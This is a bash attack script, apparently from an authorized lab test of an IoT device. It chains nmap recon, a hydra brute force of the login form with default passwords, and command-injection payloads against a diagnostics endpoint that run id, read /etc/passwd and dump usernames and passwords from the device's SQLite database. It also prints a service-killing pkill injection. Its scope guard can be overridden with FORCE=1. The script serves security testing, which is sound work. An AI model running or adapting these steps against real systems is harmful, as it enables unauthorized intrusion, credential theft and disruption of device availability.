#!/usr/bin/env bash
# Reproduce the intended attack chain against the lab device ONLY.
#
# Scope guard: refuses any target other than 192.168.100.90 unless FORCE=1.
# Usage: ./scripts/attack-iot.sh [--yes]
set -uo pipefail
umask 077

TARGET="${TARGET:-192.168.100.90}"
PORT="${PORT:-8080}"
BASE="http://${TARGET}:${PORT}"
OUT_RECON="${OUT_RECON:-logs/phase-iot-2026-11-06/recon}"
OUT_DIR="${OUT_DIR:-logs/phase-iot-2026-11-06/attack}"
STAMP="$(date -u +%Y%m%dT%H%M%SZ)"
ASSUME_YES=0
FAIL=0

[[ "${1:-}" == "--yes" || "${1:-}" == "-y" ]] && ASSUME_YES=1

if [[ "$TARGET" != "192.168.100.90" && "${FORCE:-0}" != "1" ]]; then
  echo "refusing target $TARGET (scope is 192.168.100.90). Set FORCE=1 to override." >&2
  exit 2
fi

for tool in nmap hydra curl; do
  command -v "$tool" >/dev/null || { echo "missing required tool: $tool" >&2; exit 3; }
done

cat <<EOF
== IIoT baseline attack chain ==
 target : $BASE
 recon  : $OUT_RECON
 attack : $OUT_DIR
 NOTE   : authorized lab only; no persistence, no other hosts.
EOF

if [[ $ASSUME_YES -eq 0 ]]; then
  if ! read -r -p "Continue? [y/N] " answer; then
    echo "aborted"; exit 0
  fi
  [[ "$answer" =~ ^[Yy]$ ]] || { echo "aborted"; exit 0; }
fi

mkdir -p "$OUT_RECON" "$OUT_DIR"
chmod 700 "$OUT_RECON" "$OUT_DIR"

fail_step() {
  echo "FAILED: $*" >&2
  FAIL=1
}

CURL=(curl -sS --max-time 20 --connect-timeout 5)

echo "[1/5] recon (nmap)"
if nmap -sV -Pn -p "$PORT" -oN "$OUT_RECON/nmap-${STAMP}.txt" "$TARGET"; then
  :
else
  fail_step "nmap"
fi

echo "[2/5] fingerprint / headers"
"${CURL[@]}" -D "$OUT_RECON/headers-root-${STAMP}.txt" -o /dev/null "$BASE/" || fail_step "headers"
"${CURL[@]}" "$BASE/health" > "$OUT_RECON/health-${STAMP}.json" || fail_step "health"

echo "[3/5] default credentials (hydra)"
USERS="$(mktemp)"
WORDS="$(mktemp)"
trap 'rm -f "$USERS" "$WORDS"' EXIT
printf '%s\n' admin operator > "$USERS"
printf '%s\n' admin operator password admin123 operator123 123456 raspberry > "$WORDS"
HYDRA_OUT="$OUT_DIR/hydra-${STAMP}.txt"
if hydra -L "$USERS" -P "$WORDS" -s "$PORT" -f -o "$HYDRA_OUT" "$TARGET" http-post-form \
  '/login:username=^USER^&password=^PASS^:F=Username atau password salah'; then
  :
else
  fail_step "hydra found no credentials"
fi

LOGIN_USER="admin"
LOGIN_PASS="admin"
if [[ -s "$HYDRA_OUT" ]]; then
  CRED="$(grep -oE 'login: [^ ]+ +password: .*' "$HYDRA_OUT" | head -n1 || true)"
  if [[ -n "$CRED" ]]; then
    LOGIN_USER="$(printf '%s' "$CRED" | sed -E 's/.*login: ([^ ]+) +password: .*/\1/')"
    LOGIN_PASS="$(printf '%s' "$CRED" | sed -E 's/.*login: [^ ]+ +password: (.*)/\1/')"
    echo "hydra credentials: ${LOGIN_USER}:${LOGIN_PASS}"
  fi
fi

echo "[4/5] authenticated access (${LOGIN_USER})"
JAR="$OUT_DIR/cookies-${STAMP}.txt"
"${CURL[@]}" -c "$JAR" -o /dev/null \
  --data-urlencode "username=${LOGIN_USER}" \
  --data-urlencode "password=${LOGIN_PASS}" "$BASE/login" || fail_step "login request"

if ! grep -q 'session' "$JAR" 2>/dev/null; then
  fail_step "no session cookie; stopping attack chain"
  echo "== result: FAILED ==" >&2
  exit 1
fi
chmod 600 "$JAR"

echo "[5/5] command injection (V1) evidence"
INJ_FILE="$OUT_DIR/injection-${STAMP}.txt"
: > "$INJ_FILE"
for payload in "127.0.0.1;id" "127.0.0.1;uname -a" "127.0.0.1;cat /etc/passwd"; do
  echo "--- payload: $payload" | tee -a "$INJ_FILE"
  "${CURL[@]}" -b "$JAR" -G --data-urlencode "host=$payload" \
    "$BASE/api/diagnostics" | tee -a "$INJ_FILE" || fail_step "payload $payload"
done
grep -q 'uid=' "$INJ_FILE" || fail_step "injection proof missing uid="

echo "--- extract credentials from SQLite via injection (V1 -> DB)"
DB_JSON="$OUT_DIR/db-users-${STAMP}.txt"
if "${CURL[@]}" -b "$JAR" -G \
  --data-urlencode 'host=127.0.0.1;sqlite3 /var/lib/iot-device/iot.db "select username||char(58)||password from users"' \
  "$BASE/api/diagnostics" > "$DB_JSON"; then
  cat "$DB_JSON"
  grep -q 'admin:' "$DB_JSON" || fail_step "credential extraction incomplete"
else
  fail_step "credential extraction"
fi

DB_DUMP="$OUT_DIR/db-dump-${STAMP}.sql"
if "${CURL[@]}" -b "$JAR" -G \
  --data-urlencode 'host=127.0.0.1;sqlite3 /var/lib/iot-device/iot.db .dump' \
  "$BASE/api/diagnostics" > "$DB_DUMP"; then
  echo "saved: $DB_DUMP (may be truncated at 4 KB by the app)"
else
  fail_step "database dump"
fi

chmod 600 "$INJ_FILE" "$DB_JSON" "$DB_DUMP" 2>/dev/null || true

echo "[*] optional availability test (not run automatically):"
echo "    curl -b $JAR -G --data-urlencode 'host=127.0.0.1;pkill -f /opt/iot-device/app.py' $BASE/api/diagnostics"
echo "    (systemd restarts the service; demonstrates availability risk)"
if [[ $FAIL -eq 0 ]]; then
  echo "== done: $OUT_RECON + $OUT_DIR =="
else
  echo "== done with FAILURES; inspect output above ==" >&2
fi
exit "$FAIL"
